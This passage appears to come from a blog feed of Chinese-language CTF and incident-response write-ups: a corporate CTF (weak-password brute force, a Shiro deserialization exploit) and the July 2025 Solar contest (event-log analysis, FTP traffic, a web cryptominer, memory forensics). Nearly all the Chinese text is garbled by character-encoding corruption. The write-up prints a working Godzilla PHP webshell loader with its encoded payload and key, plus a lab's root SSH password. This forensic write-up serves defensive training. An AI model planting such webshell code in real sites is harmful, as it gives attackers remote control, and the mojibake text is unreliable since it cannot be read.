ï¼Œè¯•äº†åœ¨sqlæ³¨å…¥ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ®µï¼Œç¬¬äºŒä¸ªå­—æ®µéƒ½ä¸å¯¹</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905144001164.png" alt="image-20250905144001164"></p><p>æ— æœï¼Œå°è¯•çˆ†ç ´</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905144051624-17570544519704.png" alt="image-20250905144051624"></p><p>å‘ç°ä¸ºå¼±å£ä»¤ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905144152229.png" alt="image-20250905144152229"></p><p>è¿™é‡Œï¼Œkeyä¸ºè¿™ä¸ªï¼Œå¯ä»¥å‘ç°ï¼Œè¿™ä¸æ˜¯å†°è3çš„ï¼Œå†°èä¸‰æ˜¯ä¸èƒ½è®¾ç½®å¯†ç çš„ï¼Œä¹Ÿå°±æ˜¯è¿™æ˜¯è®¾ç½®çš„keyï¼Œå†°è3é»˜è®¤çš„keyå¿…é¡»æ˜¯16è¿›åˆ¶çš„ï¼Œå°±æ˜¯å¯†ç çš„md5çš„å‰åå…­ä½ï¼Œå¿…ç„¶ä¸å¯ä»¥æœ‰wklkjuï¼Œé‚£ä¹ˆè¿™é‡Œå¯èƒ½è¿˜è¦å›å»æ‰¾ğŸï¼Œæ²¡æœ‰é©¬çš„è¯ï¼Œåªèƒ½çŒœäº†ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905144603630.png" alt="image-20250905144603630"></p><p>è¿™é‡Œç›´æ¥çŒœï¼Œå°±æ˜¯aesçš„é©¬ï¼Œç›´æ¥ä¸Šé¢çš„å“¥æ–¯æ‹‰ç›´æ¥æ”¹ä¸‹keyå³å¯</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905144843488.png" alt="image-20250905144843488"></p><p>å³å¯å¾—åˆ°ååŠéƒ¨åˆ†flagï¼Œæ‹¼æ¥å³å¯ã€‚</p><h3 id="web1-æ¯”èµ›ä¸­æœªå‡º"><a href="#web1-æ¯”èµ›ä¸­æœªå‡º" class="headerlink" title="web1 æ¯”èµ›ä¸­æœªå‡º"></a>web1 æ¯”èµ›ä¸­æœªå‡º</h3><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªjarï¼Œè¯´æ˜¯shiroï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905145203274.png" alt="image-20250905145203274"></p><p>åç¼–è¯‘æŸ¥çœ‹ï¼Œå­˜åœ¨æ¥å£ï¼Œå­˜åœ¨ååºåˆ—åŒ–ï¼Œå› ä¸ºæ˜¯shiroï¼Œæ‰€ä»¥éœ€è¦keyï¼Œä½†å…¨éƒ¨jarçœ‹å®Œä¸ºæ‰¾åˆ°keyã€‚</p><p>2022MTCTFWP-Web ezjavaï¼Œè€ƒè¿‡ï¼Œï¼›ç»•è¿‡</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905145403044.png" alt="image-20250905145403044"></p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905145608886.png" alt="image-20250905145608886"></p><p>è¿™ä¸ªæ¼æ´å¯ä»¥ç»•è¿‡ã€‚<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905145701457.png" alt="image-20250905145701457"></p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905145710414.png" alt="image-20250905145710414"></p><p>æ¥å—inputï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905150322699-17570558030555.png" alt="image-20250905150322699"></p><p>è¿™é‡Œç”¨å¤§å¸ˆå‚…çš„å·¥å…·ç›´æ¥ç”Ÿæˆé“¾å­ï¼Œç”Ÿæˆå›æ˜¾çš„ï¼Œè®°å¾—è¦urlencodeï¼Œåœ¨bpä¸­å‘åŒ…ã€‚</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905150428760.png" alt="image-20250905150428760"></p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905150457326.png" alt="image-20250905150457326"></p><p>headæ‰§è¡Œå‘½ä»¤å³å¯ã€‚æ­¤é¢˜åœ¨å¤§å¸ˆå‚…<code>A_llen</code>å¸®åŠ©ä¸‹å®Œæˆï¼Œæ„Ÿè°¢å¤§å¸ˆå‚…ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp</title>
      <link href="/2025/07/26/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88-%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/07/26/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ</h4><p>é¢˜ç›®æè¿°</p><p>è¯·æäº¤éšè—ç”¨æˆ·çš„åç§°ï¼Ÿ</p><p> åˆ›å»ºç”¨æˆ·è´¦æˆ·çš„äº‹ä»¶ï¼ˆEvent ID: 4720ï¼‰</p><p>4720ï¼Œç›´æ¥æœ4720<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726154853486.png" alt="image-20250726154853486"></p><p>åŠä¸€ä¸ªåŒ…ï¼Œ<code>solar$</code></p><p>ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ</p><p>91äººå·²è§£ç­”</p><p>ikunikeceiLucifrix</p><p>é¢˜ç›®æè¿°</p><p>è¯·æäº¤é»‘å®¢çš„IPåœ°å€ï¼Ÿ</p><p>åˆ†æ•°</p><p>55.19 åˆ†</p><p>è¿™é‡Œåœ°å€ä¸ºï¼Œä»–ç™»é™†è¿‡å—å®³æœºå™¨ï¼Œç”±äºç½‘ç«™æ²¡æœ‰æ—¥å¿—ï¼Œå°±çŒœè¿™ä¸ªåœ°å€</p><p>ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ</p><p>96äººå·²è§£ç­”</p><p>StravvberryGourdboychaiLucifrix</p><p>é¢˜ç›®æè¿°</p><p>è¯·æäº¤é»‘å®¢çš„ä¸€å¥è¯æœ¨é©¬å¯†ç ï¼Ÿ</p><p>åˆ†æ•°</p><p>69.14 åˆ†</p><p>uploadä¸‹é¢å°±æ˜¯</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155134517.png" alt="image-20250726155134517"></p><p>ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ</p><p>89äººå·²è§£ç­”</p><p>StravvberryGourdGuokeHHHXXX</p><p>é¢˜ç›®æè¿°</p><p>è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—ç”¨æˆ·çš„TargetSidï¼ˆç›®æ ‡è´¦æˆ·å®‰å…¨IDï¼‰ï¼Ÿ</p><p>åˆ†æ•°</p><p>70.53 åˆ†<br>åˆšåˆšåˆ›å»ºç”¨æˆ·çš„æ—¶å€™å·²ç»çŸ¥é“</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155245166.png" alt="image-20250726155245166"></p><p>ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ</p><p>82äººå·²è§£ç­”</p><p>StravvberryGourdHHHXXXLucifrix</p><p>é¢˜ç›®æè¿°</p><p>è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„äº‹ä»¶ï¼ˆæ ¼å¼ä¸º å¹´/æœˆ/æ—¥ æ—¶:åˆ†:ç§’ï¼‰ï¼Ÿ</p><p>åˆ†æ•°</p><p>72.02 åˆ†</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155321067.png" alt="image-20250726155321067"></p><p>ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ</p><p>81äººå·²è§£ç­”</p><p>StravvberryGourdGuokeHHHXXX</p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢å°†è¿™ä¸ªéšè—ç”¨æˆ·å…ˆååŠ å…¥äº†å“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Ÿæäº¤æ ¼å¼ä¸º ç¬¬ä¸€ä¸ªç”¨æˆ·ç»„-ç¬¬äºŒä¸ªç”¨æˆ·ç»„ï¼Œå¦‚student-teacher</p><p>åˆ†æ•°</p><p>72.24 åˆ†</p><p>è¿™é‡ŒåŠ å…¥ç”¨æˆ·ç»„çš„äº‹ä»¶idä¸º4732<br>ç­›é€‰å2ä¸ª</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155513684-17535165139651.png" alt="image-20250726155513684"></p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155533440.png" alt="image-20250726155533440"></p><p>Users-Administrators</p><p>ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ</p><p>69äººå·²è§£ç­”</p><p>StravvberryGourdGuoken0o0b</p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢é€šè¿‡è¿œç¨‹æ¡Œé¢æˆåŠŸç™»é™†ç³»ç»Ÿç®¡ç†å‘˜è´¦å·çš„ç½‘ç»œåœ°å€åŠç«¯å£å·ï¼Ÿæäº¤æ ¼å¼ä¸º IP:PORT å¦‚ 127.0.0.1:41110</p><p>åˆ†æ•°</p><p>75.08 åˆ†</p><p>åŠ å…¥ç”¨æˆ·ç»„ä¸º7.23 17:06,æˆåŠŸç™»å½•idä¸º4624<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726155800934.png" alt="image-20250726155800934"></p><p>09åˆ†ç™»å½•</p><p>ã€é¢˜ç›®ä¿¡æ¯ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</p><p>0äººå·²è§£ç­”</p><p>è™šä½ä»¥å¾…è™šä½ä»¥å¾…è™šä½ä»¥å¾…</p><p>é¢˜ç›®æè¿°</p><p>æ€è€Œå¬å…¬äº¤ç³»ç»Ÿè¢«é»‘å®¢æ”»å‡»ï¼Œé»‘å®¢é€šè¿‡webè¿›è¡Œäº†æ”»å‡»å¹¶è·å–äº†æ•°æ®ï¼Œç„¶åè·å–äº†å…¶ä¸­ä¸€ä½é©¾æ ¡å¸ˆå‚…åœ¨FTPæœåŠ¡ä¸­çš„ç§å¯†æ–‡ä»¶ï¼Œå…¶åé»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è¿›è¡Œäº†GETshellï¼Œæ§åˆ¶äº†ä¸»æœºæƒé™å¹¶æ¤å…¥äº†æŒ–çŸ¿ç½‘é¡µæŒ–çŸ¿ç—…æ¯’ï¼Œæ¥ä¸‹æ¥ä½ éœ€è¦é€æ­¥æ’æŸ¥ã€‚<br>æ³¨æ„ï¼š<br>æµé‡ä¸­çš„21ç«¯å£å¯¹åº”2121ã€80ç«¯å£å¯¹åº”8090ã€‚<br>rootçš„SSHå¯†ç ä¸ºbussec123ï¼Œç¬¬äºŒä¸ªåœ°å€æ˜¯SSHåœ°å€ã€‚<br>è¯·å‹¿åœ¨æ­¤æäº¤FLAGï¼Œè¯·å‰å¾€å…·ä½“ä»»åŠ¡æäº¤ï¼Œå¦‚ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥ æäº¤ã€‚</p><p>åˆ†æ•°</p><p>0 åˆ†</p><p>ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</p><p>54äººå·²è§£ç­”</p><p>Guokedyzq1234St0rm</p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢é€šè¿‡è·å–çš„ç”¨æˆ·åå¯†ç ï¼Œåˆ©ç”¨å¯†ç å¤ç”¨æŠ€æœ¯ï¼Œçˆ†ç ´äº†FTPæœåŠ¡ï¼Œåˆ†ææµé‡ä»¥åæ‰¾åˆ°å¼€æ”¾çš„FTPç«¯å£ï¼Œå¹¶æ‰¾åˆ°é»‘å®¢ç™»å½•æˆåŠŸåè·å–çš„ç§å¯†æ–‡ä»¶ï¼Œæäº¤å…¶æ–‡ä»¶ä¸­å†…å®¹ï¼Œæäº¤æ ¼å¼ï¼šflag{xxx}</p><p>åˆ†æ•°</p><p>179.14 åˆ†</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726174446435.png" alt="image-20250726174446435"></p><p>ç«¯å£2121</p><p>ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</p><p>73äººå·²è§£ç­”</p><p>Guokeæ¥šé¢–ikecei</p><p>é¢˜ç›®æè¿°</p><p>å¯æ¶çš„é»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½ éœ€è¦åˆ†ææ—¥å¿—å’Œæµé‡ä»¥åŠwebå¼€æ”¾çš„ç¨‹åºæ‰¾åˆ°é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæäº¤æœ¨é©¬ä½¿ç”¨çš„å¯†ç ï¼Œæäº¤æ ¼å¼ï¼šflag{password}</p><p>åˆ†æ•°</p><p>248.19 åˆ†</p><p>æœ‰phpçš„æµé‡<img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170136475.png" alt="image-20250726170136475"></p><p>ç›´æ¥æ‰¾å³å¯<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170207761-17535205279422.png" alt="image-20250726170207761"></p><p>æ˜¯ä¸€ä¸ªgodzillaé©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">for($i=0;$i&lt;strlen($D);$i++)&#123;</span><br><span class="line">$c = $K[$i+1&amp;15];</span><br><span class="line">$D[$i] = $D[$i]^$c;</span><br><span class="line">&#125;</span><br><span class="line">return $D;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$pass=&#x27;pass&#x27;;</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class="line">echo gzdecode(encode(base64_decode(&#x27;fL1tMGI4YTljMUhl+1q6dXsAFwSID4m4QjulvhqntVGokAEvsN0xjfQ3iBq09ARXcZMtSlq0BXFZhV18f+ZhPrEUWJRLotW+dd+QOiIwqAiXL8doW810w2zmJJ92NFQAnMquxw0LhemW4dL0OmkbTABVJokDWAQFfRo7K0t+eaj9XUwTQeRvpBM5uW0oau0dns279iTPcXE4qr/wV2jPXMD/E3KeGFW3srGN9nFo7iC9CtzPhOleu92EvON72AMHa0puQaDO1ysCG11Lg7lD9iKw6AA3yTdnrAQg6f5tbzzVANIG2Y4autANFrhIyFHzwIxwyKZIHL0a6dLS5UF7CmBzM3/yyWay+E6LSMTvmID0/cJXzSdfZ/3M72euck8gfRqqrkxnnYnbyK1XbujcTp3Nuvv1B04mvnuwzElKiubo2XN/3OGGB7ZVe2EHVIoZApjtUoBk2v4k+fWkYZMKrVAahzYcdsUnku09IxU0p3xdjPNzLQw1JF/3dC6AKGikBK6t0+KZpvpdcDYtgA5pDmszGvDg10swCGTrx/GsEddXcliuwjGAKrMmYUNGiu9tLjdrDPy7XDJasDK738UEqxsYLp8/fRCAPdbrDoqPncKY86a3cuKSQhyNT0RVxbZ8zNnYAO8wjI2truoNzdGK9r4Ngj/cdVKJX4r459nbk/QSW37Jy39GCKGWNtZptezfv6vhiHBMZJutn/iqovSuxyaHXEIr2dJwQ/VMO5e4GMV2LGpohsIBLzrpODv+8QDfRFNFejFQXVfDfwGZUcOb8XMxxpvsuc47JXAjVMKAB+nPDzZXb6AmmIQjLY/SLJ+cWlgRTbBoppeE4OR1BSTHIH/N1b1v529/UyhPc7JVlbBS4xSyy7KpnF8gF+XuJeOvoRTpE+XqfU4rtRaPdj2ZqSsFsZH+GYzhZsGD64YuF7yGW36qv47F0LuwpnGe43hhwp/6alkqeHMFaaEWTwq2OL5UyGb47YZb1aFUKoS09jKxTVLU4OBKXxZEl9iZmgUxnrSCeKWwpeFMSMFLHJf4LhOaEgHDkaZSVavjHFit3Pj0zeBudI0HU6A/p6uqIROpsgYeteR7J4xYJRo4VuTrvt1W4ZEVoqcFUFLV0UqwHSEqTOzp7QXuSFrkNhvrU00Vmv842dEpK0ghtdNQo6/tgjMQdxg/QSwuR5nrKH+pgeAKv9ZkRZyHUI4CiHeldiyrrYGEaOgw7xRxUcQIbQYyK7RPzFD3TMlGm65uNIMo0MMlVMm+g/pq/5mtnLsmaDAgTwqPP3m/Xb4aex2A8nej4jnUCQbPbjsGSHNkYhUZIKHmh+RZRYOfCeMwVK7GDvtrS5IEsFsJLbb9FzHxqzjsPkSl3WqQjGizNoYF5CUIhSxwXrZC1W7Kb1Hy+/ZrDOMlpDds2KNxdh+nHJoP+BmImCoZsCTUtk9/V7xVjSK3cSYr/PfcabsgWx8BfRGpN9074adE8XU82seSWwd4GB//xvmIa2K7m7EN7zSE2EDuJNphlGBGMWsNtzZwDyAHgUhYuZjJmX9Ae0sINrMPEl2Rm1ORBhs5U5PnPXPv6X9CSIC1sAIXB/IXed3spGlJRkrKDJ0XSyVakEHjdujc2ltY27SiJL7bGSmVaHzfMO5RM5b3X7CVFTxcNcZYAUS5mioBMYazWtJVoGLjkT/JQuwcVXOx0IApFTWwWKUdb+NgNAnDSbaczxJ8rcUCboU3Tpjj1C6yv/Om+e3nzCHXtTI4Io0SY9rHfzwJEFQAsOfPYQs3gxcssgBRBPr0Btn7QLQe7K/ndlmJMWuIZOjt+WgqqsYdsE0BTX5zFuTYNIqpfUbPpqz0yVmq7TxgnmVuopVmLnsET1fJijo6oF87yTEAXQFSGYWYbkEcdD1I8xjqylMiiSuIFUcPNeCx0a0p6IBylcD4TGhVo54zLU+zU0ttOpwpA/T3KUM0YzE=&#x27;),$key));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</p><p>29äººå·²è§£ç­”</p><p>GuokeStravvberryGourddaye8ku</p><p>é¢˜ç›®æè¿°</p><p>åˆ†ææµé‡ï¼Œé»‘å®¢æ¤å…¥äº†ä¸€ä¸ªwebæŒ–çŸ¿æœ¨é©¬ï¼Œè¿™ä¸ªæœ¨é©¬ç°å®æƒ…å†µä¸‹ä¼šåœ¨ç”¨æˆ·è®¿é—®åæ¶ˆè€—ç”¨æˆ·çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿(æœ¬ç¯å¢ƒå·²åšæ— å®³åŒ–å¤„ç†)ï¼Œæäº¤é»‘å®¢ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶æ—¶çš„åˆå§‹åç§°ï¼Œæäº¤æ ¼å¼ï¼šflag{xxx.xxx}</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170320932.png" alt="image-20250726170320932"></p><p>7102æµé‡æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ <br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170357394.png" alt="image-20250726170357394"></p><p>ä¼ çš„æ–‡ä»¶åä¸ºmap.phpä¸”æœ‰ä¸€æ®µæ··æ·†js</p><p>ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</p><p>29äººå·²è§£ç­”</p><p>GuokeStravvberryGourdn0o0b</p><p>é¢˜ç›®æè¿°</p><p>åˆ†ææµé‡å¹¶ä¸Šæœºæ’æŸ¥ï¼Œé»‘å®¢æ¤å…¥çš„ç½‘é¡µæŒ–çŸ¿æœ¨é©¬æ‰€ä½¿ç”¨çš„çŸ¿æ± åœ°å€æ˜¯ä»€ä¹ˆï¼Œæäº¤çŸ¿æ± åœ°å€(æ’æŸ¥å®Œæ¯•åå¯ä»¥å°è¯•åˆ é™¤å®ƒ)æäº¤æ ¼å¼ï¼šflag{xxxxxxx.xxxx.xxx:xxxx}</p><p>åˆ†æ•°</p><p>274.83 åˆ†</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170456282.png" alt="image-20250726170456282"></p><p>è¿™ä¸€æ®µä¸ºçŸ¿å€ï¼Œ<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726170530937.png" alt="image-20250726170530937"></p><p>ã€é¢˜ç›®ä¿¡æ¯ã€‘VOL_EASY</p><p>0äººå·²è§£ç­”</p><p>è™šä½ä»¥å¾…è™šä½ä»¥å¾…è™šä½ä»¥å¾…</p><p>é¢˜ç›®æè¿°</p><p>æŸä¼ä¸šæœåŠ¡å™¨è¿‘æ—¥é­å—éšç§˜å…¥ä¾µã€‚å®‰å…¨å›¢é˜Ÿé€šè¿‡æ—¥å¿—æº¯æºå‘ç°ï¼Œé»‘å®¢åˆ©ç”¨Webåº”ç”¨æ¼æ´æ¤å…¥æ¶æ„åé—¨ï¼Œæ ¹æ®æº¯æºçš„ä¿¡æ¯é…åˆè­¦æ–¹é€®æ•äº†é»‘å®¢ï¼Œå®‰å…¨å›¢é˜Ÿå·²ç»ç´§æ€¥ä¿å­˜äº†é»‘å®¢ç”µè„‘çš„å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼Œè¯·ä½ å¼€å§‹å–è¯ä»¥ä¾¿å›ºå®šè¯æ®ã€‚è¯·æ ¹æ®é¢˜ç›®æ–‡ä»¶ï¼Œæ‰¾å‡ºä¸‹é¢10æ¡è¯æ®è®©ç½ªçŠ¯æœè½¯å§ï¼</p><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š<br>é€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼švol_easy.zip<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1afek1JIX8J0tXoPwTSp84g?pwd=w6iu">https://pan.baidu.com/s/1afek1JIX8J0tXoPwTSp84g?pwd=w6iu</a> æå–ç : w6iu</p><p>è§£å‹å¯†ç ï¼š0f6941beab90bc8be5bc25b6c56ee849</p><p>æ³¨æ„ï¼š<br>è¯·å‹¿åœ¨æ­¤æäº¤FLAGï¼Œè¯·å‰å¾€å…·ä½“ä»»åŠ¡æäº¤ï¼Œå¦‚ã€ä»»åŠ¡1ã€‘VOL_EASY æäº¤ã€‚</p><p>åˆ†æ•°</p><p>0 åˆ†</p><p>ã€ä»»åŠ¡1ã€‘VOL_EASY</p><p>79äººå·²è§£ç­”</p><p>liebertYouEatMyBugmrl64</p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬å¯†ç æ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æ•°</p><p>72.69 åˆ†<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726180631762.png" alt="image-20250726180631762"></p><p>ã€ä»»åŠ¡2ã€‘VOL_EASY</p><p>87äººå·²è§£ç­”</p><p><a href="mailto:&#109;&#x72;&#108;&#x36;&#52;&#89;&#111;&#117;&#x45;&#x61;&#x74;&#x4d;&#121;&#x42;&#117;&#x67;&#50;&#x39;&#48;&#57;&#54;&#x36;&#x31;&#x33;&#x37;&#55;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#109;">&#109;&#x72;&#108;&#x36;&#52;&#89;&#111;&#117;&#x45;&#x61;&#x74;&#x4d;&#121;&#x42;&#117;&#x67;&#50;&#x39;&#48;&#57;&#54;&#x36;&#x31;&#x33;&#x37;&#55;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#109;</a></p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·å«ä»€ä¹ˆï¼ˆæ¯”å¦‚xx.exeï¼‰ï¼Ÿ(ä»…é¦–å­—æ¯å¤§å†™)</p><p>åˆ†æ•°</p><p>70.95 åˆ†</p><p>èšå‰‘<img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726180718439.png" alt="image-20250726180718439"></p><p>ã€ä»»åŠ¡3ã€‘VOL_EASY</p><p>82äººå·²è§£ç­”</p><p><a href="mailto:&#89;&#111;&#117;&#69;&#x61;&#116;&#77;&#121;&#x42;&#x75;&#x67;&#50;&#x39;&#x30;&#57;&#54;&#54;&#x31;&#x33;&#55;&#55;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;&#100;&#x61;&#x79;&#101;&#56;&#107;&#117;">&#89;&#111;&#117;&#69;&#x61;&#116;&#77;&#121;&#x42;&#x75;&#x67;&#50;&#x39;&#x30;&#57;&#54;&#54;&#x31;&#x33;&#55;&#55;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;&#100;&#x61;&#x79;&#101;&#56;&#107;&#117;</a></p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·çš„ä½ç½®åœ¨å“ªé‡Œï¼ˆæ¯”å¦‚C:\xxxx\xx.exeï¼‰ ï¼Ÿ</p><p>åˆ†æ•°</p><p>108.03 åˆ†</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726181323160.png" alt="image-20250726181323160"></p><p>cmdline æŸ¥çœ‹</p><p>ã€ä»»åŠ¡4ã€‘VOL_EASY</p><p>84äººå·²è§£ç­”</p><p><a 